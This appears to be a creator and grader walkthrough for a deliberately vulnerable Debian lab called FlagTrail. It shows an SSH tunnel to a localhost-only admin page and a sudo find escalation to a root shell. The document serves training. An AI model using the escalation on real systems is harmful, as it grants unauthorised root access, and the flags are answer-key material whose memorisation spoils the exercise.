FlagTrail

Intentionally vulnerable lab (Debian 13): anonymous web recon all the way to root, in six chained flags. Creator & grader document — contains spoilers.

Flag 1 / 6
⚠️ Training target. Run host-only. Never bridge it to a real network or the internet. Every weakness below is intentional and scoped to exactly these six flags — nothing else is exploitable.

Goal. Capture all six flags in order — anonymous web recon through an SSH foothold and a localhost-only service to a root privilege escalation.

Scope. Only attack the IP you were given.

Scenario & overview

Candidates get only the target IP (host-only, e.g. 192.168.56.x) and a hint that an SMB share exists. Goal: collect all six FLAG{…} values in order and show their work — the chain is linear, each flag feeds the next.

Port forwarding to localhost

tunneling / pivoting

An internal admin page runs on the box but is bound to 127.0.0.1:8000 — closed from the network. Tunnel it out over SSH.

# from the attacker box — forward local 8000 -> guest's 127.0.0.1:8000
$ ssh -L 8000:127.0.0.1:8000 hasker@<target-ip>
# then, in another terminal:
$ curl http://127.0.0.1:8000/ | grep -o 'FLAG{[^}]*}'
FLAG{port_forwarding_unlocks_localhost}
5FLAG{port_forwarding_unlocks_localhost}

Verified

Port 8000 is CLOSED from the network; the service listens on 127.0.0.1 only — a tunnel is required.
6

Privilege escalation — sudo find

GTFOBins + enumeration

Enumerate sudo rights instead of guessing. hasker may run /usr/bin/find as root with no password — a classic GTFOBins escalation.

$ sudo -l
    (ALL) NOPASSWD: /usr/bin/find
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt

Why this box is "minimal"

No unintended vulns

  • Web app is static — no RCE, upload, or injection.
  • hasker is in no admin group; its only sudo right is /usr/bin/find.
  • SMB is a single read-only guest share — no write, no home shares, no printers.
  • Internal page bound to 127.0.0.1 only.
  • SSH: root login disabled; password auth for hasker only.
  • /root/root.txt is 0600 root:root; each flag is reachable only at its intended stage.
